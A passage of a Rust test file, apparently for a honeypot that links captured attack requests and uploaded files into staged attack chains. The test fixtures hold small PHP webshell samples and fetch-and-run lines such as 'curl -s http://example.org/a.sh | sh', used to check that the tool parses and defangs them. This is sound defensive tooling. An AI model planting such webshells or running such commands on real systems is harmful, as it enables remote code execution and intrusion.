        assert_eq!(pieces_of(&s, &last).await, [n - 1]);
    }

    #[tokio::test]
    async fn file_over_the_cap_is_left_out() {
        let (s, _d) = store().await;
        assert_eq!(HARD_FANOUT_MAX, 50);
        let (over, at_cap) = (("file", "11", "file"), ("file", "22", "file"));
        // Were the file a joiner, it would fuse the two stagers.
        let (mut a, mut b, mut left_out) = (0, 0, 0);
        for i in 0..=HARD_FANOUT_MAX as i64 {
            left_out = sight(&s, over, ("upload", i), i).await;
            match i % 4 {
                0 | 1 => a = sight(&s, STAGER_A, ("upload", i), i).await,
                _ => b = sight(&s, STAGER_B, ("upload", i), i).await,
            }
        }
        let mut kept = 0;
        for i in 0..HARD_FANOUT_MAX as i64 {
            kept = sight(&s, at_cap, ("upload", 1000 + i), i).await;
        }
        run(&s).await;
        let n: i64 = sqlx::query_scalar("SELECT COUNT(*) FROM chain_pieces WHERE piece = ?")
            .bind(left_out)
            .fetch_one(&s.pool)
            .await
            .unwrap();
        assert_eq!(n, 0, "over the cap");
        assert_eq!(pieces_of(&s, &key_of(a)).await, [a]);
        assert_eq!(pieces_of(&s, &key_of(b)).await, [b]);
        assert_eq!(pieces_of(&s, &key_of(kept)).await, [kept], "at the cap");
    }

    #[tokio::test]
    async fn other_roles_of_a_stager_piece_join_nothing() {
        let (s, _d) = store().await;
        // A URL piece is `stager` by kind whatever its role.
        sight(
            &s,
            ("stager", "x.example.org", "queried"),
            ("request", 1),
            10,
        )
        .await;
        sight(
            &s,
            ("stager", "y.example.org", "self-hosted"),
            ("request", 1),
            10,
        )
        .await;
        run(&s).await;
        assert!(chains(&s).await.is_empty());
        // In a chain's source they are no describers either.
        let a = sight(&s, STAGER_A, ("request", 1), 10).await;
        run(&s).await;
        assert_eq!(pieces_of(&s, &key_of(a)).await, [a]);
    }

    #[tokio::test]
    async fn describers_attach_by_source_not_by_address() {
        let (s, _d) = store().await;
        let a = sight(&s, STAGER_A, ("request", 1), 10).await;
        let r = sight(&s, RECIPE, ("request", 1), 10).await;
        let t = sight(&s, ("tag", "cve_2024_4577", "tag"), ("request", 1), 10).await;
        let e = sight(&s, ("exploit", "POST /x", "exploit"), ("request", 1), 10).await;
        let p = sight(&s, ("shell-profile", "c99", "opaque"), ("request", 1), 10).await;
        // The same address, another request.
        sight(&s, ("recipe", "wget|sh", "recipe"), ("request", 2), 10).await;
        run(&s).await;
        assert_eq!(pieces_of(&s, &key_of(a)).await, sorted(vec![a, r, t, e, p]));
        assert_eq!(chains(&s).await[0].4, 1, "one source");
    }

    /// A later request, stored as the trap stores it.
    async fn request(
        s: &Store,
        ip: &str,
        (method, path): (&str, &str),
        status: i64,
        answer: &str,
        ts: &str,
    ) -> i64 {
        let ip_id = s.upsert_ip(ip.parse().unwrap()).await.unwrap().id;
        s.insert_request(&NewRequest {
            ip_id,
            method: method.into(),
            path: path.into(),
            headers_json: "[]".into(),
            labels_json: "[]".into(),
            answer: Some(answer.into()),
            status: Some(status),
            ts: Some(ts.into()),
            ..Default::default()
        })
        .await
        .unwrap()
    }

    /// Pieces and chains from what is stored.
    async fn pass(s: &Store) -> String {
        extract(&s.pool).await.unwrap();
        run(s).await;
        use sha2::Digest;
        let hex = data_encoding::HEXLOWER.encode(&sha2::Sha256::digest(FILE));
        key_of(piece_hash("file", &hex))
    }

    fn ids(rows: Vec<TimelineRow>) -> Vec<i64> {
        rows.into_iter().map(|r| r.id).collect()
    }

    const UPLOADER: &str = "203.0.113.5";
    const OTHER: &str = "203.0.113.6";
    const LATER: &str = "2999-01-01 00:00:00";
    const SHELL: i64 = 200;

    #[tokio::test]
    async fn follow_ups_attach_through_the_file() {
        let (s, _d) = store().await;
        seed_upload(&s, UPLOADER, "/up/a.php", FILE).await;
        // From another address, and to the file: it counts.
        let r = request(&s, OTHER, ("GET", "/up/a.php"), SHELL, "webshell", LATER).await;
        // From the uploader, and not to the file: it does not.
        request(&s, UPLOADER, ("GET", "/noise.php"), 404, "default", LATER).await;
        let key = pass(&s).await;
        let mut c = s.pool.acquire().await.unwrap();
        assert_eq!(ids(follow_ups(&mut c, &key).await.unwrap()), [r]);
    }

    #[tokio::test]
    async fn two_uploads_at_one_path_show_a_follow_up_once() {
        let (s, _d) = store().await;
        seed_upload(&s, UPLOADER, "/up/a.php", FILE).await;
        seed_upload(&s, OTHER, "/up/a.php", FILE).await;
        let r = request(&s, OTHER, ("GET", "/up/a.php"), SHELL, "webshell", LATER).await;
        let key = pass(&s).await;
        let mut c = s.pool.acquire().await.unwrap();
        assert_eq!(uploads_of(&mut c, &key).await.unwrap().len(), 2);
        // The second upload was itself sent to the first one's path.
        let got = ids(follow_ups(&mut c, &key).await.unwrap());
        assert_eq!(got.len(), 2, "{got:?}");
        assert_eq!(got[1], r);
    }

    #[tokio::test]
    async fn root_webshell_rows_are_not_follow_ups() {
        let (s, _d) = store().await;
        for path in ["/", "/.env", "/up/a.php"] {
            seed_upload(&s, UPLOADER, path, FILE).await;
        }
        request(&s, OTHER, ("GET", "/"), SHELL, "webshell", LATER).await;
        request(&s, OTHER, ("GET", "/.env"), SHELL, "webshell", LATER).await;
        // A POST is not what the decoy answers: this one is a real use.
        let post = request(&s, OTHER, ("POST", "/.env"), SHELL, "webshell", LATER).await;
        let real = request(&s, OTHER, ("GET", "/up/a.php"), SHELL, "webshell", LATER).await;
        let key = pass(&s).await;
        let mut c = s.pool.acquire().await.unwrap();
        assert_eq!(uploads_of(&mut c, &key).await.unwrap().len(), 3);
        assert_eq!(ids(follow_ups(&mut c, &key).await.unwrap()), [post, real]);
    }

    #[tokio::test]
    async fn dead_end_is_a_404_for_the_file_within_60_seconds() {
        let (s, _d) = store().await;
        seed_upload(&s, UPLOADER, "/up/s.php", FILE).await;
        sqlx::query("UPDATE uploads SET ts = ?")
            .bind(T0)
            .execute(&s.pool)
            .await
            .unwrap();
        sqlx::query("UPDATE requests SET ts = ?")
            .bind(T0)
            .execute(&s.pool)
            .await
            .unwrap();
        let get = |path| ("GET", path);
        let at_60 = "2026-10-01 00:01:00";
        let at_61 = "2026-10-01 00:01:01";
        let at_30 = "2026-10-01 00:00:30";
        let hit = request(&s, UPLOADER, get("/other/s.php"), 404, "default", at_60).await;
        let near = request(&s, UPLOADER, get("/s.php"), 404, "default", at_30).await;
        // Too late, someone else, found, not the name, before the upload.
        request(&s, UPLOADER, get("/other/s.php"), 404, "default", at_61).await;
        request(&s, OTHER, get("/other/s.php"), 404, "default", at_30).await;
        request(&s, UPLOADER, get("/other/s.php"), 200, "default", at_30).await;
        request(&s, UPLOADER, get("/other/xs.php"), 404, "default", at_30).await;
        request(
            &s,
            UPLOADER,
            get("/other/s.php"),
            404,
            "default",
            "2026-09-30 23:59:59",
        )
        .await;
        let key = pass(&s).await;
        let mut c = s.pool.acquire().await.unwrap();
        assert_eq!(ids(dead_ends(&mut c, &key).await.unwrap()), [near, hit]);
    }

    /// A request, stored and sighted as a body naming `pieces` would be.
    async fn sighted(s: &Store, ip: &str, path: &str, pieces: &[(&str, &str, &str)]) -> (i64, i64) {
        let id = request(s, ip, ("POST", path), 200, "default", T0).await;
        let ip_id = s.upsert_ip(ip.parse().unwrap()).await.unwrap().id;
        for &p in pieces {
            sight(s, p, ("request", id), ip_id).await;
        }
        (id, ip_id)
    }

    fn seen(hash: i64) -> sqlx::query::Query<'static, sqlx::Sqlite, sqlx::sqlite::SqliteArguments> {
        sqlx::query("UPDATE piece_sightings SET grade = 'seen' WHERE piece = ?").bind(hash)
    }

    fn stage<'a>(c: &'a Chain, name: &str) -> &'a [StageRow] {
        let s = c.stages.iter().find(|s| s.name == name).unwrap();
        &s.rows
    }

    fn one<'a>(c: &'a Chain, name: &str) -> &'a StageRow {
        match stage(c, name) {
            [r] => r,
            rows => panic!("{name}: {rows:?}"),
        }
    }

    /// A campaign of these address ids, keyed `key`.
    async fn campaign(s: &Store, key: &str, ips: &[i64]) {
        sqlx::query(
            "INSERT INTO campaigns (key, num, anchor_ip_id, size, first_seen, last_seen,
               hard_edges, soft_edges, v, computed_at)
             VALUES (?, 1, ?, 1, 't', 't', 0, 0, 1, 't')",
        )
        .bind(key)
        .bind(ips[0])
        .execute(&s.pool)
        .await
        .unwrap();
        for ip in ips {
            sqlx::query("INSERT INTO campaign_members (ip_id, campaign_key) VALUES (?, ?)")
                .bind(ip)
                .bind(key)
                .execute(&s.pool)
                .await
                .unwrap();
        }
    }

    const TAG: (&str, &str, &str) = ("tag", "cve_2024_4577", "tag");
    const TAG_SELFREP: (&str, &str, &str) = ("tag", "cve_2024_4577.selfrep", "tag");
    const EXPLOIT_A: (&str, &str, &str) = ("exploit", "POST /hello.world", "exploit");
    const EXPLOIT_B: (&str, &str, &str) = ("exploit", "POST /", "exploit");

    #[test]
    fn stage_names_are_the_spec_s() {
        let c = Chain {
            key: None,
            stages: stages(
                &Parts {
                    key: None,
                    found: &[],
                    tags: &[],
                    uploads: &[],
                    follow: &FollowUps::default(),
                    results: &[],
                },
                &Here::default(),
            ),
            ips: 0,
            sources: 0,
            first_seen: String::new(),
            last_seen: String::new(),
            more: 0,
        };
        let names = c.stages.each_ref().map(|s| s.name);
        assert_eq!(
            names,
            ["Exploit", "Command", "Delivery", "Payload", "Follow-up"]
        );
    }

    #[tokio::test]
    async fn same_chain_from_all_anchors() {
        let (s, _d) = store().await;
        let (id, ip) = sighted(&s, UPLOADER, "/a", &[STAGER_A, RECIPE]).await;
        run(&s).await;
        campaign(&s, UPLOADER, &[ip]).await;
        let want = key_of(piece_hash(STAGER_A.0, STAGER_A.1));
        for a in [
            Anchor::Request(id),
            Anchor::Ip(ip),
            Anchor::Campaign(UPLOADER),
            Anchor::Piece(piece_hash(STAGER_A.0, STAGER_A.1)),
        ] {
            let chains = s.chains_of(a).await.unwrap();
            assert_eq!(chains.len(), 1, "{a:?}");
            assert_eq!(chains[0].key.as_deref(), Some(want.as_str()), "{a:?}");
            assert_eq!(stage(&chains[0], "Delivery").len(), 1, "{a:?}");
        }
    }

    #[tokio::test]
    async fn same_chain_from_an_upload() {
        let (s, _d) = store().await;
        let uid = seed_upload(&s, UPLOADER, "/up/a.php", FILE).await;
        let key = pass(&s).await;
        let chains = s.chains_of(Anchor::Upload(&uid)).await.unwrap();
        assert_eq!(chains.len(), 1);
        assert_eq!(chains[0].key.as_deref(), Some(key.as_str()));
        assert!(one(&chains[0], "Delivery").here);
        assert!(one(&chains[0], "Delivery").joiner);
        assert_eq!(one(&chains[0], "Delivery").label, "s[.]php");
    }

    #[tokio::test]
    async fn a_request_shows_the_chain_of_the_upload_it_carried() {
        let (s, _d) = store().await;
        let uid = seed_upload(&s, UPLOADER, "/up/a.php", FILE).await;
        let key = pass(&s).await;
        let mut c = s.pool.acquire().await.unwrap();
        let carrier = uploads::get(&mut c, &uid)
            .await
            .unwrap()
            .unwrap()
            .request_id;
        drop(c);
        let chains = s
            .chains_of(Anchor::Request(carrier.unwrap()))
            .await
            .unwrap();
        assert_eq!(chains[0].key.as_deref(), Some(key.as_str()));
        assert!(one(&chains[0], "Payload").here);
    }

    #[tokio::test]
    async fn exploit_rows_group_by_tag_before_the_first_dot() {
        let (s, _d) = store().await;
        sighted(&s, UPLOADER, "/a", &[STAGER_A, TAG, EXPLOIT_A]).await;
        sighted(&s, OTHER, "/b", &[STAGER_A, TAG_SELFREP, EXPLOIT_B]).await;
        let bare = ("exploit", "POST /bare", "exploit");
        let (id, _) = sighted(&s, OTHER, "/c", &[STAGER_A, bare]).await;
        run(&s).await;
        let chains = s.chains_of(Anchor::Request(id)).await.unwrap();
        let rows = stage(&chains[0], "Exploit");
        assert_eq!(rows.len(), 2, "{rows:?}");
        assert_eq!(rows[0].label, "cve_2024_4577");
        assert_eq!(rows[0].mark, Mark::Claimed, "a tag is the attacker's word");
        assert!(rows[0].detail.contains("attacker's tag"), "{rows:?}");
        assert!(rows[0].detail.contains("POST /hello[.]world"), "{rows:?}");
        assert!(rows[0].detail.contains("POST /"), "{rows:?}");
        assert_eq!(
            rows[0].href.as_deref(),
            Some("/admin/evidence/links/exploit-tag/cve_2024_4577")
        );
        // No tag: a row of its own, and this request's.
        assert_eq!(rows[1].label, "POST /bare");
        assert!(rows[1].here && !rows[0].here);
    }

    #[tokio::test]
    async fn payload_is_a_gap_without_a_result() {
        let (s, _d) = store().await;
        let (id, _) = sighted(&s, UPLOADER, "/a", &[STAGER_A]).await;
        run(&s).await;
        let chains = s.chains_of(Anchor::Request(id)).await.unwrap();
        let gap = one(&chains[0], "Payload");
        assert_eq!(gap.mark, Mark::Gap);
        assert_eq!(gap.piece, Some(piece_hash(STAGER_A.0, STAGER_A.1)));
        assert_eq!(
            gap.href.as_deref(),
            Some("/admin/evidence/links/stager/a.example.org")
        );
        // No upload: nothing could have run.
        let follow = one(&chains[0], "Follow-up");
        assert_eq!(follow.mark, Mark::Gap);
        assert!(follow.detail.contains("never ran here"), "{follow:?}");
    }

    #[tokio::test]
    async fn result_fills_payload_for_the_whole_chain() {
        use crate::store::pieces::NewResult;
        let (s, _d) = store().await;
        let (a, _) = sighted(&s, UPLOADER, "/a", &[STAGER_A]).await;
        let (b, _) = sighted(&s, OTHER, "/b", &[STAGER_A]).await;
        run(&s).await;
        let h = piece_hash(STAGER_A.0, STAGER_A.1);
        let new = NewResult {
            family: Some("Mirai".into()),
            sha256: Some("ab".repeat(32)),
            source_url: Some("https://example.org/report".into()),
            ..Default::default()
        };
        s.add_piece_result(h, &new, "admin").await.unwrap();
        s.add_piece_result(
            h,
            &NewResult {
                sha256: Some("cd".repeat(32)),
                ..Default::default()
            },
            "admin",
        )
        .await
        .unwrap();
        for id in [a, b] {
            let chains = s.chains_of(Anchor::Request(id)).await.unwrap();
            let rows = stage(&chains[0], "Payload");
            assert_eq!(rows.len(), 2, "one row per result: {rows:?}");
            assert!(rows.iter().all(|r| r.mark == Mark::External));
            assert_eq!(rows[0].label, "Mirai");
            assert!(rows[0].detail.contains("external"), "{:?}", rows[0]);
            assert_eq!(rows[1].label, "sha256 cdcdcdcdcdcd");
            assert_eq!(rows[0].piece, Some(h));
        }
    }

    #[tokio::test]
    async fn uploaded_text_fills_payload_as_seen() {
        let (s, _d) = store().await;
        let uid = seed_upload(&s, UPLOADER, "/up/a.php", FILE).await;
        seed_upload(&s, OTHER, "/up/a.php", FILE).await;
        pass(&s).await;
        let chains = s.chains_of(Anchor::Upload(&uid)).await.unwrap();
        let row = one(&chains[0], "Payload");
        assert_eq!(row.mark, Mark::Seen);
        assert_eq!(row.label, "s[.]php");
        assert!(row.detail.contains("2 uploads"), "{row:?}");
        assert!(
            row.href
                .as_deref()
                .unwrap()
                .starts_with("/admin/traps/uploads/")
        );
        assert!(row.here);
        // Not held: the file is known, its text is not.
        sqlx::query("DELETE FROM upload_blobs")
            .execute(&s.pool)
            .await
            .unwrap();
        let chains = s.chains_of(Anchor::Upload(&uid)).await.unwrap();
        assert_eq!(one(&chains[0], "Payload").mark, Mark::Gap);
        assert_eq!(stage(&chains[0], "Delivery").len(), 1);
    }

    #[tokio::test]
    async fn binary_upload_leaves_a_gap() {
        let (s, _d) = store().await;
        let uid = seed_upload(&s, UPLOADER, "/up/a.php", FILE).await;
        pass(&s).await;
        sqlx::query("UPDATE uploads SET sniffed_type = 'elf'")
            .execute(&s.pool)
            .await
            .unwrap();
        let chains = s.chains_of(Anchor::Upload(&uid)).await.unwrap();
        let gap = one(&chains[0], "Payload");
        assert_eq!(gap.mark, Mark::Gap);
        assert!(
            gap.href.as_deref().unwrap().contains("/links/file/"),
            "{gap:?}"
        );
    }

    #[tokio::test]
    async fn dead_end_shows_in_follow_up() {
        let (s, _d) = store().await;
        let uid = seed_upload(&s, UPLOADER, "/up/s.php", FILE).await;
        for table in ["UPDATE uploads SET ts = ?", "UPDATE requests SET ts = ?"] {
            sqlx::query(table).bind(T0).execute(&s.pool).await.unwrap();
        }
        let path = ("GET", "/other/s.php");
        let at_30 = "2026-10-01 00:00:30";
        let hit = request(&s, UPLOADER, path, 404, "default", at_30).await;
        pass(&s).await;
        let chains = s.chains_of(Anchor::Upload(&uid)).await.unwrap();
        let row = one(&chains[0], "Follow-up");
        assert_eq!(row.mark, Mark::DeadEnd);
        assert_eq!(row.label, "GET /other/s[.]php");
        assert!(row.detail.contains("404 within 60 seconds"), "{row:?}");
        assert_eq!(row.href, Some(format!("/admin/requests/{hit}")));
    }

    #[tokio::test]
    async fn follow_ups_show_as_seen_once_per_request() {
        let (s, _d) = store().await;
        seed_upload(&s, UPLOADER, "/up/a.php", FILE).await;
        let shell = ("GET", "/up/a.php");
        request(&s, OTHER, shell, SHELL, "webshell", LATER).await;
        let last = request(&s, OTHER, shell, SHELL, "webshell", LATER).await;
        let key = pass(&s).await;
        let chains = s.chains_of(Anchor::Request(last)).await.unwrap();
        // A request with no piece of its own has no strip, though it used
        // the file; the upload's chain has it.
        assert!(chains.is_empty());
        let file = key_piece(&key).unwrap();
        let chains = s.chains_of(Anchor::Piece(file)).await.unwrap();
        let rows = stage(&chains[0], "Follow-up");
        let row = rows.iter().find(|r| r.label == "GET /up/a[.]php").unwrap();
        assert_eq!(row.mark, Mark::Seen);
        assert_eq!(row.detail, "2 requests · webshell 200");
    }

    /// A request to `path` with this query and body.
    async fn sent(s: &Store, path: &str, query: Option<&str>, body: Option<&[u8]>) -> i64 {
        let ip_id = s.upsert_ip(OTHER.parse().unwrap()).await.unwrap().id;
        s.insert_request(&NewRequest {
            ip_id,
            method: "POST".into(),
            path: path.into(),
            query: query.map(Into::into),
            body: body.map(<[u8]>::to_vec),
            headers_json: "[]".into(),
            labels_json: "[]".into(),
            answer: Some("webshell".into()),
            status: Some(SHELL),
            ts: Some(LATER.into()),
            ..Default::default()
        })
        .await
        .unwrap()
    }

    async fn pieces_pass(s: &Store) {
        extract(&s.pool).await.unwrap();
        run(s).await;
    }

    /// The Follow-up rows of `uid`'s chain.
    async fn follow_rows(s: &Store, uid: &str) -> Vec<StageRow> {
        let chains = s.chains_of(Anchor::Upload(uid)).await.unwrap();
        stage(&chains[0], "Follow-up").to_vec()
    }

    const SHELL_GET: &[u8] = b"<?php system($_GET['tool']); echo 'a shell of 32 bytes or so'; ?>";

    #[tokio::test]
    async fn a_follow_up_shows_the_command_its_shell_reads() {
        let (s, _d) = store().await;
        let uid = seed_upload(&s, UPLOADER, "/up/a.php", SHELL_GET).await;
        let by_query = "tool=wget+http%3A%2F%2Fexample.org%2Fx";
        sent(&s, "/up/a.php", Some(by_query), None).await;
        // Not the shell's input: `cmd` means nothing to this one.
        sent(&s, "/up/a.php", Some("cmd=id"), None).await;
        pieces_pass(&s).await;
        let rows = follow_rows(&s, &uid).await;
        let row = rows
            .iter()
            .find(|r| r.label.starts_with("wget"))
            .expect("read");
        assert_eq!(row.label, "wget hxxp://example[.]org/x");
        assert_eq!(row.detail, "1 request · webshell 200 · POST /up/a[.]php");
        assert!(
            rows.iter().any(|r| r.label == "POST /up/a[.]php?cmd=id"),
            "{rows:?}"
        );
    }

    #[tokio::test]
    async fn a_follow_up_reads_a_posted_or_raw_input() {
        let (s, _d) = store().await;
        let php = b"<?php system($_POST['c']); echo 'a shell of 32 bytes or so'; ?>";
        let uid = seed_upload(&s, UPLOADER, "/up/a.php", php).await;
        sent(&s, "/up/a.php", None, Some(b"c=uname+-a")).await;
        pieces_pass(&s).await;
        assert!(
            follow_rows(&s, &uid)
                .await
                .iter()
                .any(|r| r.label == "uname -a")
        );
        let raw = b"<?php eval(file_get_contents('php://input')); echo 'padding'; ?>";
        let uid = seed_upload(&s, UPLOADER, "/up/b.php", raw).await;
        sent(&s, "/up/b.php", None, Some(b"echo hello")).await;
        pieces_pass(&s).await;
        assert!(
            follow_rows(&s, &uid)
                .await
                .iter()
                .any(|r| r.label == "echo hello")
        );
    }

    #[tokio::test]
    async fn a_follow_up_with_no_profile_shows_its_recipe() {
        let (s, _d) = store().await;
        let uid = seed_upload(&s, UPLOADER, "/up/a.php", FILE).await;
        let body = b"curl -s http://example.org/a.sh | sh";
        sent(&s, "/up/a.php", None, Some(body)).await;
        pieces_pass(&s).await;
        let x = parse(
            Source::Request {
                method: "POST",
                path: "/up/a.php",
                query: None,
                body: Some(body),
                sender: None,
            },
            Policy::embedded(),
        );
        let want = label(&x.recipes[0].normal);
        let rows = follow_rows(&s, &uid).await;
        assert!(rows.iter().any(|r| r.label == want), "{want}: {rows:?}");
    }

    #[tokio::test]
    async fn a_follow_up_never_shows_a_private_key() {
        let (s, _d) = store().await;
        let uid = seed_upload(&s, UPLOADER, "/up/s.php", SHELL_GET).await;
        let pem =
            "-----BEGIN OPENSSH PRIVATE KEY-----\nQUJDREVG\n-----END OPENSSH PRIVATE KEY-----";
        let plain = crate::admin::public::urlencode(&format!("echo '{pem}' > /tmp/k"));
        let hidden = data_encoding::BASE64.encode(pem.as_bytes());
        let hidden =
            crate::admin::public::urlencode(&format!("echo {hidden} | base64 -d > /tmp/k"));
        let (a, b) = (format!("tool={plain}"), format!("tool={hidden}"));
        sent(&s, "/up/s.php", Some(&a), None).await;
        sent(&s, "/up/s.php", Some(&b), None).await;
        // A dead end's query is not read at all, and its path is masked.
        let key_path = format!("/x{}/s.php", crate::admin::public::urlencode(pem));
        for table in ["UPDATE uploads SET ts = ?", "UPDATE requests SET ts = ?"] {
            sqlx::query(table).bind(T0).execute(&s.pool).await.unwrap();
        }
        let at_30 = "2026-10-01 00:00:30";
        request(&s, UPLOADER, ("GET", &key_path), 404, "default", at_30).await;
        pieces_pass(&s).await;
        let rows = follow_rows(&s, &uid).await;
        assert!(rows.len() >= 2, "{rows:?}");
        for r in &rows {
            let text = format!("{} {}", r.label, r.detail);
            for gone in ["PRIVATE", "BEGIN", "QUJDREVG", "LS0tLS1", "tool="] {
                assert!(!text.contains(gone), "{gone}: {r:?}");
            }
        }
    }

    #[tokio::test]
    async fn a_request_that_carried_an_upload_is_read_without_its_body() {
        let (s, _d) = store().await;
        let raw = b"<?php eval(file_get_contents('php://input')); echo 'padding'; ?>";
        let uid = seed_upload(&s, UPLOADER, "/up/a.php", raw).await;
        let second = seed_upload(&s, OTHER, "/up/a.php", raw).await;
        let mut c = s.pool.acquire().await.unwrap();
        let carrier = uploads::get(&mut c, &second)
            .await
            .unwrap()
            .unwrap()
            .request_id;
        drop(c);
        sqlx::query("UPDATE requests SET body = 'UPLOADMARK' WHERE id = ?")
            .bind(carrier)
            .execute(&s.pool)
            .await
            .unwrap();
        pieces_pass(&s).await;
        let rows = follow_rows(&s, &uid).await;
        assert!(
            rows.iter().any(|r| r.label == "PUT /up/a[.]php"),
            "{rows:?}"
        );
        assert!(!format!("{rows:?}").contains("UPLOADMARK"), "{rows:?}");
    }

    #[tokio::test]
    async fn follow_ups_past_the_cap_are_counted_not_read() {
        let (s, _d) = store().await;
        let uid = seed_upload(&s, UPLOADER, "/up/a.php", SHELL_GET).await;
        for i in 0..FOLLOW_READS_MAX + 3 {
            sent(&s, "/up/a.php", Some(&format!("tool=c{i}")), None).await;
        }
        pieces_pass(&s).await;
        let rows = follow_rows(&s, &uid).await;
        assert_eq!(rows.len(), FOLLOW_READS_MAX + 1, "{rows:?}");
        let last = rows.last().unwrap();
        assert_eq!(last.label, "3 more requests");
        assert_eq!(last.href, Some(format!("/admin/traps/uploads/{uid}")));
    }

    #[tokio::test]
    async fn timelines_read_the_newest_uploads_only() {
        let (s, _d) = store().await;
        for i in 0..TIMELINE_UPLOADS + 2 {
            let path = format!("/up/{i}.php");
            seed_upload(&s, UPLOADER, &path, FILE).await;
            sent(&s, &path, None, None).await;
        }
        let key = pass(&s).await;
        let mut c = s.pool.acquire().await.unwrap();
        assert_eq!(
            uploads_of(&mut c, &key).await.unwrap().len(),
            TIMELINE_UPLOADS + 2
        );
        let rows = follow_ups(&mut c, &key).await.unwrap();
        assert_eq!(rows.len(), TIMELINE_UPLOADS, "{rows:?}");
        assert!(
            rows.iter()
                .all(|r| r.path != "/up/0.php" && r.path != "/up/1.php")
        );
    }

    #[tokio::test]
    async fn one_statement_reads_each_uploads_timeline() {
        let (s, _d) = store().await;
        let noisy = seed_upload(&s, UPLOADER, "/noisy.php", FILE).await;
        let quiet = seed_upload(&s, UPLOADER, "/quiet.php", FILE).await;
        for _ in 0..4 {
            sent(&s, "/noisy.php", None, None).await;
        }
        let last = sent(&s, "/quiet.php", None, None).await;
        let mut c = s.pool.acquire().await.unwrap();
        let rows = [
            uploads::get(&mut c, &noisy).await.unwrap().unwrap(),
            uploads::get(&mut c, &quiet).await.unwrap().unwrap(),
        ];
        let all = uploads::timelines(&mut c, &rows).await.unwrap();
        assert!(all.iter().any(|r| r.id == last));
        assert!(
            all.windows(2)
                .all(|w| (&w[0].ts, w[0].id) <= (&w[1].ts, w[1].id))
        );
        let one = uploads::timeline(&mut c, &rows[1]).await.unwrap();
        assert_eq!(one.iter().map(|r| r.id).collect::<Vec<_>>(), [last]);
    }

    #[tokio::test]
    async fn pieces_past_the_cap_are_counted_and_joiners_stay() {
        let (s, _d) = store().await;
        let (id, ip) = sighted(&s, UPLOADER, "/a", &[STAGER_A]).await;
        for i in 0..FOUND_MAX + 5 {
            let value = format!("recipe-{i}");
            sight(&s, ("recipe", &value, "recipe"), ("request", id), ip).await;
        }
        run(&s).await;
        let chains = s.chains_of(Anchor::Ip(ip)).await.unwrap();
        let c = &chains[0];
        assert_eq!(c.more, 6);
        assert_eq!(stage(c, "Command").len(), FOUND_MAX - 1);
        assert_eq!(one(c, "Delivery").label, "a[.]example[.]org");
        // The same bound without a key.
        let hash = piece_hash("recipe", "recipe-0");
        let chains = s.chains_of(Anchor::Piece(hash)).await.unwrap();
        let c = &chains[0];
        assert_eq!(c.key, None);
        assert_eq!(c.more, 6);
        assert_eq!(one(c, "Delivery").label, "a[.]example[.]org");
    }

    #[tokio::test]
    async fn a_lookup_by_piece_uses_the_index() {
        let (s, _d) = store().await;
        let plan: Vec<(i64, i64, i64, String)> =
            sqlx::query_as("EXPLAIN QUERY PLAN SELECT chain FROM chain_pieces WHERE piece = 1")
                .fetch_all(&s.pool)
                .await
                .unwrap();
        assert!(plan[0].3.contains("idx_chain_pieces_piece"), "{plan:?}");
    }

    #[test]
    fn inputs_come_from_every_profile() {
        let p = |value: &str| Found {
            hash: 1,
            kind: "shell-profile".into(),
            value: value.into(),
            role: "recipe".into(),
            seen: true,
            ips: 1,
        };
        let found = [
            p("input=$_GET[a],$_POST[b];exec=system;marker=x"),
            p("input=php://input;exec=eval"),
        ];
        assert_eq!(
            shell_inputs(&found),
            ["$_GET[a]", "$_POST[b]", "php://input"]
        );
    }

    #[tokio::test]
    async fn stages_a_source_did_not_use_are_dimmed() {
        let (s, _d) = store().await;
        sighted(&s, OTHER, "/b", &[STAGER_A, RECIPE]).await;
        let (id, _) = sighted(&s, UPLOADER, "/a", &[STAGER_A, EXPLOIT_A]).await;
        run(&s).await;
        let chains = s.chains_of(Anchor::Request(id)).await.unwrap();
        assert_eq!(one(&chains[0], "Exploit").dim, false);
        assert!(one(&chains[0], "Exploit").here);
        assert!(one(&chains[0], "Delivery").here);
        // Another source's recipe still shows, dimmed.
        let recipe = one(&chains[0], "Command");
        assert!(recipe.dim && !recipe.here, "{recipe:?}");
        assert!(one(&chains[0], "Payload").dim);
        // Other anchors dim nothing.
        let (_, ip) = sighted(&s, UPLOADER, "/c", &[]).await;
        let chains = s.chains_of(Anchor::Ip(ip)).await.unwrap();
        assert!(
            chains[0]
                .stages
                .iter()
                .all(|s| s.rows.iter().all(|r| !r.dim))
        );
        assert!(one(&chains[0], "Exploit").here, "what this address sent");
        assert!(!one(&chains[0], "Command").here);
    }

    #[tokio::test]
    async fn queried_urls_never_appear_in_a_strip() {
        let (s, _d) = store().await;
        let queried = ("stager", "metadata.example.org", "queried");
        let hosted = ("stager", "203.0.113.5", "self-hosted");
        let (only, _) = sighted(&s, UPLOADER, "/q", &[queried, hosted]).await;
        let (id, _) = sighted(&s, UPLOADER, "/a", &[STAGER_A, queried]).await;
        run(&s).await;
        assert!(s.chains_of(Anchor::Request(only)).await.unwrap().is_empty());
        let queried_piece = piece_hash(queried.0, queried.1);
        assert!(
            s.chains_of(Anchor::Piece(queried_piece))
                .await
                .unwrap()
                .is_empty()
        );
        let chains = s.chains_of(Anchor::Request(id)).await.unwrap();
        assert_eq!(one(&chains[0], "Delivery").label, "a[.]example[.]org");
    }

    #[tokio::test]
    async fn a_forged_name_stays_out_of_the_other_chain() {
        let (s, _d) = store().await;
        // One body names both; they stay two chains.
        let (id, _) = sighted(&s, UPLOADER, "/a", &[STAGER_A, STAGER_B]).await;
        sighted(&s, OTHER, "/b", &[STAGER_A]).await;
        run(&s).await;
        let chains = s.chains_of(Anchor::Request(id)).await.unwrap();
        assert_eq!(chains.len(), 2);
        for c in &chains {
            assert_eq!(stage(c, "Delivery").len(), 1, "{c:?}");
        }
    }

    #[tokio::test]
    async fn joinerless_request_gets_its_own_chain_and_a_link_to_the_addresses_chains() {
        let (s, _d) = store().await;
        let (_, ip) = sighted(&s, UPLOADER, "/a", &[STAGER_A]).await;
        let (id, _) = sighted(&s, UPLOADER, "/b", &[RECIPE, EXPLOIT_A, TAG]).await;
        run(&s).await;
        let chains = s.chains_of(Anchor::Request(id)).await.unwrap();
        assert_eq!(chains.len(), 1);
        let c = &chains[0];
        assert_eq!(c.key, None);
        assert_eq!((c.ips, c.sources), (1, 1));
        assert_eq!(one(c, "Exploit").label, "cve_2024_4577");
        assert!(one(c, "Exploit").detail.contains("POST /hello[.]world"));
        assert!(one(c, "Command").here);
        assert!(stage(c, "Delivery").is_empty());
        assert_eq!(c.title(), "no joiner");
        // The address's chains are the link.
        let of_address = s.chains_of(Anchor::Ip(ip)).await.unwrap();
